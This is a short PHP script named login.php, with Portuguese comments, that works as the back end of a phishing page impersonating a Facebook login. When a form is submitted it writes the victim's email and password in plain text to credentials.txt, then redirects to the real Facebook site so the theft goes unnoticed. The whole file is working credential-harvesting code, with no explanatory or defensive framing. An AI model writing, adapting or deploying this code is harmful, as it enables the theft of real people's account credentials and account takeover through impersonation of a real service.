<?php
// login.php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Salvar credenciais em um arquivo
    $file = fopen('credentials.txt', 'a');
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);

    // Redireciona para o Facebook real
    header('Location: https://www.facebook.com/');
    exit();
}